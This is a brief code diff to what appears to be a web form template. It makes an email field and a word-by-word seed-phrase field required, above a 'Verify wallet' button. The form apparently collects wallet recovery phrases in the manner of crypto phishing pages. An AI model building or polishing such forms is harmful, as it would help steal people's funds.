@@ -25,6 +25,7 @@
               type="email"
               placeholder="Enter your email"
               v-model="formState.ai"
+              required
             />
 
           </div>
@@ -38,6 +39,7 @@
               type="text"
               :placeholder="'Word ' + (index + 1)"
               v-model="seedPhrase[index]"
+              required
             />
           </div>
           <div class="btn"><button type="submit">Verify wallet</button></div>
